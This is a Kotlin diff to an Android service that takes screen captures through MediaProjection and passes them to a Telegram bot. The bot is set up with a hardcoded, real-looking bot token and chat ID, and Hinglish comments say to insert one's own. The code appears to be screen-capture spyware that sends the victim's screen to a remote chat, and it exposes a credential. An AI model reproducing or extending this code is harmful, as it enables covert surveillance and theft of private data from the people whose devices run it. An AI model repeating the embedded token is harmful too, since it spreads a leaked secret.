@@ -69,20 +69,26 @@ class ScreenshotService : Service() {
         intent?.let {
             if (it.hasExtra("resultCode") && it.hasExtra("data")) {
                 val resultCode = it.getIntExtra("resultCode", 0)
-                @Suppress("DEPRECATION")
-                val data = it.getParcelableExtra<Intent>("data")
+                val data: Intent? = if (Build.VERSION.SDK_INT >= 33) {
+                    it.getParcelableExtra("data", Intent::class.java)
+                } else {
+                    @Suppress("DEPRECATION")
+                    it.getParcelableExtra("data")
+                }
 
-                val projectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
-                mediaProjection = projectionManager.getMediaProjection(resultCode, data)
+                if (data != null) {
+                    val projectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+                    mediaProjection = projectionManager.getMediaProjection(resultCode, data)
 
-                // 🔴 BOT TOKEN YAHAN DAALO
-                val bot = TelegramBot(
-                    "8668374754:AAEftxVfvzLVsajQRWSt0iJv5a18N90Vupg",  // ← YAHAN APNA TOKEN DAALO
-                    "8507217564",    // ← YAHAN APNA CHAT ID DAALO
-                    this
-                )
-                val screenshotTaker = ScreenshotTaker(this, bot)
-                screenshotTaker.setMediaProjection(mediaProjection!!)
+                    // 🔴 BOT TOKEN YAHAN DAALO
+                    val bot = TelegramBot(
+                        "8668374754:AAEftxVfvzLVsajQRWSt0iJv5a18N90Vupg",  // ← YAHAN APNA TOKEN DAALO
+                        "8507217564",    // ← YAHAN APNA CHAT ID DAALO
+                        this
+                    )
+                    val screenshotTaker = ScreenshotTaker(this, bot)
+                    screenshotTaker.setMediaProjection(mediaProjection!!)
+                }
             }
         }
 
